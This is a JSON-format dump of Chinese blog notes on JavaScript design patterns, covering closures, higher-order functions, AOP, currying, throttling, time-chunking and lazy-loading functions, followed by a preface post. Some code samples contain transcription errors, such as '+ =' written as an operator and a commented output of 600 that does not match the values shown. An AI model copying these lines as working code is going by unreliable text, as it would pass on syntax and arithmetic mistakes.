&#123;&#125;; var calculate = function() &#123; // 封 闭 calculate 函 数 var a = 1; for (var i = 0, l = arguments.length; i &lt; l; i++) &#123; a = a * arguments[i]; &#125; return a; &#125;; return function() &#123; var args = Array.prototype.join.call(arguments, ','); if (args in cache) &#123; return cache[args]; &#125; return cache[args] = calculate.apply(null, arguments); &#125;&#125;)(); 2.延续局部变量的寿命img对象经常用于进行数据上报，如下所示：12345var report = function(src) &#123; var img = new Image(); img.src = src; &#125;;report('getUserInfo'); 但是一些低版本浏览器的实现存在bug，在这些浏览器下使用report函数进行数据上报会丢失30%左右的数据，也就是说，report函数并不是每一次都成功发起了HTTP请求。 丢失数据的原因是img是report函数中的局部变量，当report函数的调用结束后，img局部变量随即被销毁，而此时或许还没来得及发出HTTP请求，所以此次请求就会丢失掉。把img变量用闭包封闭起来，便能解决请求丢失的问题：12345678var report = (function() &#123; var imgs = []; return function(src) &#123; var img = new Image(); imgs.push(img); img.src = src; &#125;&#125;)(); 闭包和面向对象设计过程与数据的结合是形容面向对象中的“对象”时经常使用的表达。对象以方法的形式包含了过程，而闭包则是在过程中以环境的形式包含了数据。通常用面向对象思想能实现的功能，用闭包也能实现。反之亦然。在JavaScript语言的祖先Scheme语言中，甚至都没有提供面向对象的原生设计，但可以使用闭包来实现一个完整的面向对象系统。例如下面跟闭包相关的代码：12345678910111213var extent = function() &#123; var value = 0; return &#123; call: function() &#123; value++; console.log(value); &#125; &#125; &#125;;var extent = extent();extent.call(); // 输 出： 1extent.call(); // 输 出： 2 extent.call(); // 输 出： 3 面向对象写法：12345678910111213141516var extent = &#123; value: 0, call: function() &#123; this.value++; console.log(this.value); &#125;&#125;;// 或var Extent = function() &#123; this.value = 0; &#125;;Extent.prototype.call = function() &#123; this.value++; console.log(this.value);&#125;;var extent = new Extent(); 用闭包实现命令模式在JavaScript版本的各种设计模式实现中，闭包的运用非常广泛。 在完成闭包实现的命令模式之前，先用面向对象的方式来编写一段命令模式的代码。作为演示作用的命令模式结构非常简单，不会对的理解造成困难，代码如下：1234567891011121314151617181920212223242526var Tv = &#123; open: function() &#123; console.log('打 开 电 视 机'); &#125;, close: function() &#123; console.log('关 上 电 视 机'); &#125;&#125;;var OpenTvCommand = function(receiver) &#123; this.receiver = receiver; &#125;;OpenTvCommand.prototype.execute = function() &#123; this.receiver.open(); // 执 行 命 令， 打 开 电 视 机 &#125;;OpenTvCommand.prototype.undo = function() &#123; this.receiver.close(); // 撤 销 命 令， 关 闭 电 视 机 &#125;;var setCommand = function(command) &#123; document.getElementById('execute').onclick = function() &#123; command.execute(); // 输 出： 打 开 电 视 机 &#125; document.getElementById('undo').onclick = function() &#123; command.undo(); // 输 出： 关 闭 电 视 机 &#125; &#125;;setCommand(new OpenTvCommand(Tv)); 命令模式的意图是把请求封装为对象，从而分离请求的发起者和请求的接收者（执行者）之间的耦合关系。在命令被执行之前，可以预先往命令对象中植入命令的接收者。 但在JavaScript中，函数作为一等对象，本身就可以四处传递，用函数对象而不是普通对象来封装请求显得更加简单和自然。如果需要往函数对象中预先植入命令的接收者，那么闭包可以完成这个工作。在面向对象版本的命令模式中，预先植入的命令接收者被当成对象的属性保存起来； 而在闭包版本的命令模式中，命令接收者会被封闭在闭包形成的环境中，代码如下：1234567891011121314151617181920212223242526272829var Tv = &#123; open: function() &#123; console.log('打 开 电 视 机'); &#125;, close: function() &#123; console.log('关 上 电 视 机'); &#125;&#125;;var createCommand = function(receiver) &#123; var execute = function() &#123; return receiver.open(); // 执 行 命 令， 打 开 电 视 机 &#125; var undo = function() &#123; return receiver.close(); // 执 行 命 令， 关 闭 电 视 机 &#125; return &#123; execute: execute, undo: undo &#125; &#125;;var setCommand = function(command) &#123; document.getElementById('execute').onclick = function() &#123; command.execute(); // 输 出： 打 开 电 视 机 &#125; document.getElementById('undo').onclick = function() &#123; command.undo(); // 输 出： 关 闭 电 视 机 &#125; &#125;;setCommand(createCommand(Tv)); 闭包与内存管理闭包是一个非常强大的特性，但人们对其也有诸多误解。一种说法是闭包会造成内存泄露，所以要尽量减少闭包的使用。 局部变量本来应该在函数退出的时候被解除引用，但如果局部变量被封闭在闭包形成的环境中，那么这个局部变量就能一直生存下去。从这个意义上看，闭包的确会使一些数据无法被及时销毁。使用闭包的一部分原因是选择主动把一些变量封闭在闭包中，因为可能在以后还需要使用这些变量，把这些变量放在闭包中和放在全局作用域，对内存方面的影响是一致的，这里并不能说成是内存泄露。如果在将来需要回收这些变量，可以手动把这些变量设为null。 跟闭包和内存泄露有关系的地方是，使用闭包的同时比较容易形成循环引用，如果闭包的作用域链中保存着一些DOM节点，这时候就有可能造成内存泄露。但这本身并非闭包的问题，也并非JavaScript的问题。在IE浏览器中，由于BOM和DOM中的对象是使用C++以COM对象的方式实现的，而COM对象的垃圾收集机制采用的是引用计数策略。在基于引用计数策略的垃圾回收机制中，如果两个对象之间形成了循环引用，那么这两个对象都无法被回收，但循环引用造成的内存泄露在本质上也不是闭包造成的。 同样，如果要解决循环引用带来的内存泄露问题，只需要把循环引用中的变量设为null即可。将变量设置为null意味着切断变量与它此前引用的值之间的连接。当垃圾收集器下次运行时，就会删除这些值并回收它们占用的内存。 需要把循环引用中的变量设为null即可。将变量设置为null意味着切断变量与它此前引用的值之间的连接。当垃圾收集器下次运行时，就会删除这些值并回收它们占用的内存。 高阶函数高阶函数是指至少满足下列条件之一的函数。 函数可以作为参数被传递； 函数可以作为返回值输出。 JavaScript语言中的函数显然满足高阶函数的条件，在实际开发中，无论是将函数当作参数传递，还是让函数的执行结果返回另外一个函数，这两种情形都有很多应用场景，下面就列举一些高阶函数的应用场景。 函数作为参数传递把函数当作参数传递，这代表可以抽离出一部分容易变化的业务逻辑，把这部分业务逻辑放在函数参数中，这样一来可以分离业务代码中变化与不变的部分。其中一个重要应用场景就是常见的回调函数。 1.回调函数在ajax异步请求的应用中，回调函数的使用非常频繁。当想在ajax请求返回之后做一些事情，但又并不知道请求返回的确切时间时，最常见的方案就是把callback函数当作参数传入发起ajax请求的方法中，待请求完成之后执行callback函数：12345678910var getUserInfo = function(userId, callback) &#123; $.ajax('getUserInfo?' + userId, function(data) &#123; if (typeof callback === 'function') &#123; callback(data); &#125; &#125;); &#125;getUserInfo(13157, function(data) &#123; alert(data.userName);&#125;); 回调函数的应用不仅只在异步请求中，当一个函数不适合执行一些请求时，也可以把这些请求封装成一个函数，并把它作为参数传递给另外一个函数，“委托”给另外一个函数来执行。 比如，想在页面中创建100个div节点，然后把这些div节点都设置为隐藏。下面是一种编写代码的方式：123456789var appendDiv = function() &#123; for (var i = 0; i &lt; 100; i++) &#123; var div = document.createElement('div'); div.innerHTML = i; document.body.appendChild(div); div.style.display = 'none'; &#125; &#125;;appendDiv(); 把div.style.display=’none’的逻辑硬编码在appendDiv里显然是不合理的，appendDiv未免有点个性化，成为了一个难以复用的函数，并不是每个人创建了节点之后就希望它们立刻被隐藏。于是把div.style.display=’none’这行代码抽出来，用回调函数的形式传入appendDiv方法：12345678910111213var appendDiv = function(callback) &#123; for (var i = 0; i &lt; 100; i++) &#123; var div = document.createElement('div'); div.innerHTML = i; document.body.appendChild(div); if (typeof callback === 'function') &#123; callback(div); &#125; &#125; &#125;;appendDiv(function(node) &#123; node.style.display = 'none';&#125;); 可以看到，隐藏节点的请求实际上是由客户发起的，但是客户并不知道节点什么时候会创建好，于是把隐藏节点的逻辑放在回调函数中，“委托”给appendDiv方法。appendDiv方法当然知道节点什么时候创建好，所以在节点创建好的时候，appendDiv会执行之前客户传入的回调函数。 2.Array.prototype.sortArray.prototype.sort接受一个函数当作参数，这个函数里面封装了数组元素的排序规则。从Array.prototype.sort的使用可以看到，的目的是对数组进行排序，这是不变的部分；而使用什么规则去排序，则是可变的部分。把可变的部分封装在函数参数里，动态传入Array.prototype.sort，使Array.prototype.sort方法成为了一个非常灵活的方法，代码如下：123456789// 从 小 到 大 排 列 [1, 4, 3].sort(function(a, b) &#123; return a - b;&#125;);// 输 出: [ 1, 3, 4 ] // 从 大 到 小 排 列[1, 4, 3].sort(function(a, b) &#123; return b - a;&#125;); // 输 出: [ 4, 3, 1 ] 函数作为返回值输出相比把函数当作参数传递，函数当作返回值输出的应用场景也许更多，也更能体现函数式编程的巧妙。让函数继续返回一个可执行的函数，意味着运算过程是可延续的。 1.判断数据的类型判断一个数据是否是数组，在以往的实现中，可以基于鸭子类型的概念来判断，比如判断这个数据有没有length属性，有没有sort方法或者slice方法等。但更好的方式是用Object.prototype.toString来计算。Object.prototype.toString.call(obj)返回一个字符串，比如Object.prototype.toString.call([1,2,3])总是返回”[object Array]”，而Object.prototype.toString.call(“str”)总是返回”[object String]”。所以可以编写一系列的isType函数。代码如下：123456789var isString = function(obj) &#123; return Object.prototype.toString.call(obj) === '[object String]'; &#125;;var isArray = function(obj) &#123; return Object.prototype.toString.call(obj) === '[object Array]'; &#125;;var isNumber = function(obj) &#123; return Object.prototype.toString.call(obj) === '[object Number]'; &#125;; 发现，这些函数的大部分实现都是相同的，不同的只是Object.prototype.toString.call(obj)返回的字符串。为了避免多余的代码，尝试把这些字符串作为参数提前值入isType函数。代码如下：123456789var isType = function(type) &#123; return function(obj) &#123; return Object.prototype.toString.call(obj) === '[object ' + type + ']'; &#125; &#125;;var isString = isType('String');var isArray = isType('Array');var isNumber = isType('Number');console.log(isArray([1, 2, 3])); // 输 出： true 还可以用循环语句，来批量注册这些isType函数：12345678910var Type = &#123;&#125;;for (var i = 0, type; type = ['String', 'Array', 'Number'][i++];) &#123; (function(type) &#123; Type['is' + type] = function(obj) &#123; return Object.prototype.toString.call(obj) === '[object ' + type + ']'; &#125; &#125;)(type)&#125;;Type.isArray([]); // 输 出： true Type.isString( \"str\" ); // 输 出： true 2.getSingle下面是一个单例模式的例子：123456var getSingle = function(fn) &#123; var ret; return function() &#123; return ret || (ret = fn.apply(this, arguments)); &#125;; &#125;; 这个高阶函数的例子，既把函数当作参数传递，又让函数执行后返回了另外一个函数。可以看看getSingle函数的效果：123456var getScript = getSingle(function() &#123; return document.createElement('script');&#125;);var script1 = getScript();var script2 = getScript();alert(script1 === script2); // 输 出： true 高阶函数实现AOPAOP（面向切面编程）的主要作用是把一些跟核心业务逻辑模块无关的功能抽离出来，这些跟业务逻辑无关的功能通常包括日志统计、安全控制、异常处理等。把这些功能抽离出来之后，再通过“动态织入”的方式掺入业务逻辑模块中。这样做的好处首先是可以保持业务逻辑模块的纯净和高内聚性，其次是可以很方便地复用日志统计等功能模块。 在Java语言中，可以通过反射和动态代理机制来实现AOP技术。而在JavaScript这种动态语言中，AOP的实现更加简单，这是JavaScript与生俱来的能力。 通常，在JavaScript中实现AOP，都是指把一个函数“动态织入”到另外一个函数之中，具体的实现技术有很多，本节通过扩展Function.prototype来做到这一点。代码如下：123456789101112131415161718192021222324Function.prototype.before = function(beforefn) &#123; var __self = this; // 保 存 原 函 数 的 引 用 return function() &#123; // 返 回 包 含 了 原 函 数 和 新 函 数 的\" 代 理\" 函 数 beforefn.apply(this, arguments); // 执 行 新 函 数， 修 正 this return __self.apply(this, arguments); // 执 行 原 函 数 &#125;&#125;;Function.prototype.after = function(afterfn) &#123; var __self = this; return function() &#123; var ret = __self.apply(this, arguments); afterfn.apply(this, arguments); return ret; &#125;&#125;;var func = function() &#123; console.log(2); &#125;;func = func.before(function() &#123; console.log(1);&#125;).after(function() &#123; console.log(3);&#125;);func(); 把负责打印数字1和打印数字3的两个函数通过AOP的方式动态植入func函数。通过执行上面的代码，看到控制台顺利地返回了执行结果1、2、3。 这种使用AOP的方式来给函数添加职责，也是JavaScript语言中一种非常特别和巧妙的装饰者模式实现。这种装饰者模式在实际开发中非常有用。 高阶函数的其他应用1.currying首先是函数柯里化（functioncurrying）。currying的概念最早由俄国数学家Moses Schönfinkel发明，而后由著名的数理逻辑学家Haskell Curry将其丰富和发展，currying由此得名。 currying又称部分求值。一个currying的函数首先会接受一些参数，接受了这些参数之后，该函数并不会立即求值，而是继续返回另外一个函数，刚才传入的参数在函数形成的闭包中被保存起来。待到函数被真正需要求值的时候，之前传入的所有参数都会被一次性用于求值。 假设要编写一个计算每月开销的函数。在每天结束之前，都要记录今天花掉了多少钱。代码如下：123456789var monthlyCost = 0;var cost = function(money) &#123; monthlyCost + = money; &#125;;cost(100); // 第 1 天 开 销 cost(200); // 第 2 天 开 销cost(300); // 第 3 天 开 销cost(700); // 第 30 天 开 销 alert(monthlyCost); // 输 出： 600 通过这段代码可以看到，每天结束后都会记录并计算到今天为止花掉的钱。但其实并不太关心每天花掉了多少钱，而只想知道到月底的时候会花掉多少钱。也就是说，实际上只需要在月底计算一次。 如果在每个月的前29天，都只是保存好当天的开销，直到第30天才进行求值计算，这样就达到了的要求。虽然下面的cost函数还不是一个currying函数的完整实现，但有助于了解其思想：12345678910111213141516171819var cost = (function() &#123; var args = []; return function() &#123; if (arguments.length === 0) &#123; var money = 0; for (var i = 0, l = args.length; i &lt; l; i++) &#123; money + = args[i]; &#125; return money; &#125; else &#123; [].push.apply(args, arguments); &#125; &#125;&#125;)();cost( 100 ); // 未 真 正 求 值 cost( 200 ); // 未 真 正 求 值 cost( 300 ); // 未 真 正 求 值 console.log( cost() ); // 求 值 并 输 出： 600 接下来编写一个通用的currying，接受一个参数表示即将要被currying的函数。在这个例子里，这个函数的作用遍历本月每天的开销并求出它们的总和。代码如下：12345678910111213141516171819202122var currying = function(fn) &#123; var args = []; return function() &#123; if (arguments.length === 0) &#123; return fn.apply(this, args); &#125; else &#123; [].push.apply(args, arguments); return arguments.callee; &#125; &#125; &#125;;var cost = (function() &#123; var money = 0; return function() &#123; for (var i = 0, l = arguments.length; i &lt; l; i++) &#123; money + = arguments[i]; &#125; return money; &#125;&#125;)();var cost = currying(cost); // 转 化 成 currying 函 数 当调用cost()时，如果明确地带上了一些参数，表示此时并不进行真正的求值计算，而是把这些参数保存起来，此时让cost函数返回另外一个函数。只有当以不带参数的形式执行cost()时，才利用前面保存的所有参数，真正开始进行求值计算。 2.uncurrying在JavaScript中，当调用对象的某个方法时，其实不用去关心该对象原本是否被设计为拥有这个方法，这是动态类型语言的特点，也是常说的鸭子类型思想。 同理，一个对象也未必只能使用它自身的方法，那么有什么办法可以让对象去借用一个原本不属于它的方法呢？答案对于来说很简单，call和apply都可以完成这个需求：1234var obj1 = &#123; name: 'sven' &#125;; var obj2 = &#123; getName: function()&#123; return this.name; &#125; &#125;; console.log( obj2.getName.call( obj1 ) ); // 输 出： sven 常常让类数组对象去借用Array.prototype的方法，这是call和apply最常见的应用场景之一，Array.prototype上的方法原本只能用来操作array对象。但用call和apply可以把任意对象当作this传入某个方法，这样一来，方法中用到this的地方就不再局限于原来规定的对象，而是加以泛化并得到更广的适用性。 那么有没有办法把泛化this的过程提取出来呢？uncurrying就是用来解决这个问题的。uncurrying的话题来自JavaScript之父BrendanEich在2011年发表的一篇Twitter。以下代码是uncurrying的实现方式之一：1234567Function.prototype.uncurrying = function() &#123; var self = this; return function() &#123; var obj = Array.prototype.shift.call(arguments); return self.apply(obj, arguments); &#125;;&#125;; 先来瞧瞧它有什么作用：12345var push = Array.prototype.push.uncurrying();(function() &#123; push(arguments, 4); console.log(arguments); // 输 出：[ 1, 2, 3, 4] &#125;)( 1, 2, 3 ); 通过uncurrying的方式，Array.prototype.push.call变成了一个通用的push函数。这样一来，push函数的作用就跟Array.prototype.push一样了，同样不仅仅局限于只能操作array对象。而对于使用者而言，调用push函数的方式也显得更加简洁和意图明了。 还可以一次性地把Array.prototype上的方法“复制”到array对象上，同样这些方法可操作的对象也不仅仅只是array对象：1234567891011121314151617for (var i = 0, fn, ary = ['push', 'shift', 'forEach']; fn = ary[i++];) &#123; Array[fn] = Array.prototype[fn].uncurrying();&#125;;var obj = &#123; \"length\": 3, \"0\": 1, \"1\": 2, \"2\": 3&#125;;Array.push(obj, 4); // 向 对 象 中 添 加 一 个 元 素 console.log(obj.length); // 输 出： 4 var first = Array.shift(obj); // 截 取 第 一 个 元 素console.log(first); // 输 出： 1 console.log(obj); // 输 出：&#123; 0: 2, 1: 3, 2: 4, length: 3&#125;Array.forEach(obj, function(i, n) &#123; console.log(n); // 分 别 输 出： 0, 1, 2 &#125;); 甚至Function.prototype.call和Function.prototype.apply本身也可以被uncurrying，不过这没有实用价值，只是使得对函数的调用看起来更像JavaScript语言的前身Scheme：1234567891011121314var call = Function.prototype.call.uncurrying();var fn = function(name) &#123; console.log(name); &#125;;call(fn, window, 'sven'); // 输 出： sven var apply = Function.prototype.apply.uncurrying();var fn = function(name) &#123; console.log(this.name); // 输 出：\" sven\" console.log(arguments); // 输 出: [1, 2, 3] &#125;;apply(fn, &#123; name: 'sven'&#125;, [1, 2, 3]); 目前已经给出了Function.prototype.uncurrying的一种实现。 调用Array.prototype.push.uncurrying()这句代码时发生了什么事情：12345678910111213141516171819Function.prototype.uncurrying = function() &#123; var self = this; // self 此 时 是 Array.prototype.push return function() &#123; var obj = Array.prototype.shift.call(arguments); // obj 是 &#123; // \"length\": 1, // \"0\": 1 // &#125; // arguments 对 象 的 第 一 个 元 素 被 截 去， 剩 下[2] return self.apply(obj, arguments); // 相 当 于 Array.prototype.push.apply( obj, 2 ) &#125;;&#125;;var push = Array.prototype.push.uncurrying();var obj = &#123; \"length\": 1, \"0\": 1&#125;;push(obj, 2);console.log(obj); // 输 出：&#123; 0: 1, 1: 2, length: 2&#125; 除了刚刚提供的代码实现，下面的代码是uncurrying的另外一种实现方式：12345Function.prototype.uncurrying = function()&#123; var self = this; return function()&#123; return Function.prototype.call.apply( self, arguments ); &#125; &#125;; 3.函数节流JavaScript中的函数大多数情况下都是由用户主动调用触发的，除非是函数本身的实现不合理，否则一般不会遇到跟性能相关的问题。但在一些少数情况下，函数的触发不是由用户直接控制的。在这些场景下，函数有可能被非常频繁地调用，而造成大的性能问题。 下面将列举一些这样的场景。 (1)函数被频繁调用的场景 window.onresize事件。给window对象绑定了resize事件，当浏览器窗口大小被拖动而改变的时候，这个事件触发的频率非常之高。如果在window.onresize事件函数里有一些跟DOM节点相关的操作，而跟DOM节点相关的操作往往是非常消耗性能的，这时候浏览器可能就会吃不消而造成卡顿现象。 mousemove事件。同样，如果给一个div节点绑定了拖曳事件（主要是mousemove），当div节点被拖动的时候，也会频繁地触发该拖曳事件函数。 上传进度。作者开发的微云的上传功能使用了一个浏览器插件。该浏览器插件在真正开始上传文件之前，会对文件进行扫描并随时通知JavaScript函数，以便在页面中显示当前的扫描进度。但该插件通知的频率非常之高，大约一秒钟10次，很显然在页面中不需要如此频繁地去提示用户。 (2)函数节流的原理整理上面提到的三个场景，发现它们面临的共同问题是函数被触发的频率太高。比如在window.onresize事件中要打印当前的浏览器窗口大小，在通过拖曳来改变窗口大小的时候，打印窗口大小的工作1秒钟进行了10次。而实际上只需要2次或者3次。这就需要按时间段来忽略掉一些事件请求，比如确保在500ms内只打印一次，可以借助setTimeout来完成这件事情。 (3)函数节流的代码实现关于函数节流的代码实现有许多种，throttle函数的原理是，将即将被执行的函数用setTimeout延迟一段时间执行。如果该次延迟执行还没有完成，则忽略接下来调用该函数的请求。throttle函数接受2个参数，第一个参数为需要被延迟执行的函数，第二个参数为延迟执行的时间。具体实现代码如下：123456789101112131415161718192021222324var throttle = function(fn, interval) &#123; var __self = fn, // 保 存 需 要 被 延 迟 执 行 的 函 数 引 用 timer, // 定 时 器 firstTime = true; // 是 否 是 第 一 次 调 用 return function() &#123; var args = arguments, __me = this; if (firstTime) &#123; // 如 果 是 第 一 次 调 用， 不 需 延 迟 执 行 __self.apply(__me, args); return firstTime = false; &#125; if (timer) &#123; // 如 果 定 时 器 还 在， 说 明 前 一 次 延 迟 执 行 还 没 有 完 成 return false; &#125; timer = setTimeout(function() &#123; // 延 迟 一 段 时 间 执 行 clearTimeout(timer); timer = null; __self.apply(__me, args); &#125;, interval || 500); &#125;; &#125;;window.onresize = throttle(function() &#123; console.log(1);&#125;, 500); 4.分时函数函数节流提供了一种限制函数被频繁调用的解决方案。下面将遇到另外一个问题，某些函数确实是用户主动调用的，但因为一些客观的原因，这些函数会严重地影响页面性能。 一个例子是创建WebQQ的QQ好友列表。列表中通常会有成百上千个好友，如果一个好友用一个节点来表示，当在页面中渲染这个列表的时候，可能要一次性往页面中创建成百上千个节点。 在短时间内往页面中大量添加DOM节点显然也会让浏览器吃不消，看到的结果往往就是浏览器的卡顿甚至假死。代码如下：123456789101112var ary = [];for (var i = 1; i &lt; = 1000; i++) &#123; ary.push(i); // 假 设 ary 装 载 了 1000 个 好 友 的 数 据 &#125;;var renderFriendList = function(data) &#123; for (var i = 0, l = data.length; i &lt; l; i++) &#123; var div = document.createElement('div'); div.innerHTML = i; document.body.appendChild(div); &#125; &#125;;renderFriendList(ary); 这个问题的解决方案之一是timeChunk函数，timeChunk函数让创建节点的工作分批进行，比如把1秒钟创建1000个节点，改为每隔200毫秒创建8个节点。 timeChunk函数接受3个参数，第1个参数是创建节点时需要用到的数据，第2个参数是封装了创建节点逻辑的函数，第3个参数表示每一批创建的节点数量。代码如下：123456789101112131415161718var timeChunk = function(ary, fn, count) &#123; var obj, t; var len = ary.length; var start = function() &#123; for (var i = 0; i &lt; Math.min(count || 1, ary.length); i++) &#123; var obj = ary.shift(); fn(obj); &#125; &#125;; return function() &#123; t = setInterval(function() &#123; if (ary.length === 0) &#123; // 如 果 全 部 节 点 都 已 经 被 创 建 好 return clearInterval(t); &#125; start(); &#125;, 200); // 分 批 执 行 的 时 间 间 隔， 也 可 以 用 参 数 的 形 式 传 入 &#125;; &#125;; 最后进行一些小测试，假设有1000个好友的数据，利用timeChunk函数，每一批只往页面中创建8个节点：12345678910var ary = [];for (var i = 1; i &lt; = 1000; i++) &#123; ary.push(i);&#125;;var renderFriendList = timeChunk(ary, function(n) &#123; var div = document.createElement('div'); div.innerHTML = n; document.body.appendChild(div);&#125;, 8);renderFriendList(); 5.惰性加载函数在Web开发中，因为浏览器之间的实现差异，一些嗅探工作总是不可避免。比如需要一个在各个浏览器中能够通用的事件绑定函数addEvent，常见的写法如下：12345678var addEvent = function(elem, type, handler) &#123; if (window.addEventListener) &#123; return elem.addEventListener(type, handler, false); &#125; if (window.attachEvent) &#123; return elem.attachEvent('on' + type, handler); &#125; &#125;; 这个函数的缺点是，当它每次被调用的时候都会执行里面的if条件分支，虽然执行这些if分支的开销不算大，但也许有一些方法可以让程序避免这些重复的执行过程。 第二种方案是这样，把嗅探浏览器的操作提前到代码加载的时候，在代码加载的时候就立刻进行一次判断，以便让addEvent返回一个包裹了正确逻辑的函数。代码如下：123456789101112var addEvent = (function() &#123; if (window.addEventListener) &#123; return function(elem, type, handler) &#123; elem.addEventListener(type, handler, false); &#125; &#125; if (window.attachEvent) &#123; return function(elem, type, handler) &#123; elem.attachEvent('on' + type, handler); &#125; &#125;&#125;)(); 目前的addEvent函数依然有个缺点，也许从头到尾都没有使用过addEvent函数，这样看来，前一次的浏览器嗅探就是完全多余的操作，而且这也会稍稍延长页面ready的时间。 第三种方案即是将要讨论的惰性载入函数方案。此时addEvent依然被声明为一个普通函数，在函数里依然有一些分支判断。但是在第一次进入条件分支之后，在函数内部会重写这个函数，重写之后的函数就是期望的addEvent函数，在下一次进入addEvent函数的时候，addEvent函数里不再存在条件分支语句：12345678910111213141516171819var addEvent = function(elem, type, handler) &#123; if (window.addEventListener) &#123; addEvent = function(elem, type, handler) &#123; elem.addEventListener(type, handler, false); &#125; &#125; else if (window.attachEvent) &#123; addEvent = function(elem, type, handler) &#123; elem.attachEvent('on' + type, handler); &#125; &#125; addEvent(elem, type, handler); &#125;;var div = document.getElementById('div1');addEvent(div, 'click', function() &#123; alert(1);&#125;);addEvent(div, 'click', function() &#123; alert(2);&#125;);","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-前言","slug":"js-pattern","date":"2017-11-01T13:25:59.000Z","updated":"2017-12-06T14:50:09.305Z","comments":true,"path":"2017/11/01/js-pattern/","link":"","permalink":"https://github.com/xmoyKING/2017/11/01/js-pattern/","excerpt":"","text":"JS设计模式这一系列笔记（搬运）出自《Javascript设计模式与开发实践》一书。究竟为什么要用设计模式，以及它们在js程序中的运用，如何使代码更高校、更容易处理。 设计模式的定义是：在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。 在软件设计中，模式是一些经过了大量实际项目验在软件设计中，模式是一些经过了大量实际项目验证的优秀解决方案。熟悉这些模式的程序员，对某些模式的理解也许形成了条件反射。当合适的场景出现时，他们可以很快地找到某种模式作为解决方案。 模式在不同语言之间的区别《设计模式》一书的副标题是“可复用面向对象软件的基础”。《设计模式》这本书完全是从面向对象设计的角度出发的，通过对封装、继承、多态、组合等技术的反复使用，提炼出一些可重复使用的面向对象设计技巧。 设计模式实际上是解决某些问题的一种思想，与具体使用的语言无关。模式社区和语言一直都在发展，如今，除了主流的面向对象语言，函数式语言的发展也非常迅猛。在函数式或者其他编程范型的语言中，设计模式依然存在。但因为语言的不同，一些设计模式在另外一些语言中的实现也许跟《设计模式》一书中的大相径庭。 比如，Command模式在Java中需要一个命令类，一个接收者类，一个调用者类。Command模式把运算块封装在命令对象的方法内，成为该对象的行为，并把命令对象四处传递。但在JavaScript这些把函数当作一等对象的语言中，函数便能封装运算块，并且函数可以被当成对象一样四处传递，这样一来，命令模式在JavaScript中就成为了一种隐形的模式。 在Java这种静态编译型语言中，无法动态地给已存在的对象添加职责，所以一般通过包装类的方式来实现装饰者模式。但在JavaScript这种动态解释型语言中，给对象动态添加职责是再简单不过的事情。这就造成了JavaScript语言的装饰者模式不再关注于给对象动态添加职责，而是关注于给函数动态添加职责。 设计模式的适用性从某些角度来看，设计模式确实有可能带来代码量的增加，或许也会把系统的逻辑搞得更复杂。但软件开发的成本并非全部在开发阶段，设计模式的作用是让人们写出可复用和可维护性高的程序。假设有一个空房间，我们要日复一日地往里面放一些东西。最简单的办法当然是把这些东西直接扔进去，但是时间久了，就会发现很难从这个房子里找到自己想要的东西，要调整某几样东西的位置也不容易。所以在房间里做一些柜子也许是个更好的选择，虽然柜子会增加我们的成本，但它可以在维护阶段为我们带来好处。使用这些柜子存放东西的规则，或许就是一种模式。 所有设计模式的实现都遵循一条原则，即“找出程序中变化的地方，并将变化封装起来”。一个程序的设计总是可以分为可变的部分和不变的部分。当我们找出可变的部分，并且把这些部分封装起来，那么剩下的就是不变和稳定的部分。这些不变和稳定的部分是非常容易复用的。这也是设计模式为什么描写的是可复用面向对象软件基础的原因。 模式应该用在正确的地方。而哪些才算正确的地方，只有在我们深刻理解了模式的意图之后，再结合项目的实际场景才会知道。 分辨模式的关键是意图而不是结构在设计模式的学习中，有人经常发出这样的疑问：代理模式和装饰者模式，策略模式和状态模式，策略模式和智能命令模式，这些模式的类图看起来几乎一模一样，它们到底有什么区别？ 实际上这种情况是普遍存在的，许多模式的类图看起来都差不多，模式只有放在具体的环境下才有意义。比如我们的手机，把它当电话的时候，它就是电话；把它当闹钟的时候，它就是闹钟；用它玩游戏的时候，它就是游戏机。有很多模式的类图和结构确实很相似，但这不太重要，辨别模式的关键是这个模式出现的场景，以及为我们解决了什么问题。 对JavaScript设计模式的误解第一个问题是习惯把静态类型语言的设计模式照搬到JavaScript中，比如为了模拟JavaScript版本的工厂方法（FactoryMethod）模式，而生硬地把创建对象的步骤延迟到子类中。实际上，在Java等静态类型语言中，让子类来“决定”创建何种对象的原因是为了让程序迎合依赖倒置原则（DIP）。在这些语言中创建对象时，先解开对象类型之间的耦合关系非常重要，这样才有机会在将来让对象表现出多态性。 而在JavaScript这种类型模糊的语言中，对象多态性是天生的，一个变量既可以指向一个类，又可以随时指向另外一个类。JavaScript不存在类型耦合的问题，自然也没有必要刻意去把对象“延迟”到子类创建，也就是说，JavaScript实际上是不需要工厂方法模式的。模式的存在首先是能为我们解决什么问题，这种牵强的模拟只会让人觉得设计模式既难懂又没什么用处。 另一个问题是习惯根据模式的名字去臆测该模式的一切。比如命令模式本意是把请求封装到对象中，利用命令模式可以解开请求发送者和请求接受者之间的耦合关系。但命令模式经常被人误解为只是一个名为execute的普通方法调用。这个方法除了叫作execute之外，其实并没有看出其他用处。所以许多人会误会命令模式的意图，以为它其实没什么用处，从而联想到其他设计模式也没有用处。这些误解都影响了设计模式在JavaScript语言中的发展。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-1-基础复习-面向对象，this","slug":"js-pattern1","date":"2017-11-01T12:15:13.000Z","updated":"2017-12-06T14:50:09.305Z","comments":true,"path":"2017/11/01/js-pattern1/","link":"","permalink":"https://github.com/xmoyKING/2017/11/01/js-pattern1/","excerpt":"","text":"学习设计模式的之前需要复习一些面向对象的基础知识、this等重要概念，以及一些函数式编程的技巧。 面向对象的JSJavaScript没有提供传统面向对象语言中的类式继承，而是通过原型委托的方式来实现对象与对象之间的继承。JavaScript也没有在语言层面提供对抽象类和接口的支持。 动态类型语言和鸭子类型编程语言按照数据类型大体可以分为两类，一类是静态类型语言，另一类是动态类型语言。静态类型语言在编译时便已确定变量的类型，而动态类型语言的变量类型要到程序运行的时候，待变量被赋予某个值之后，才会具有某种类型。 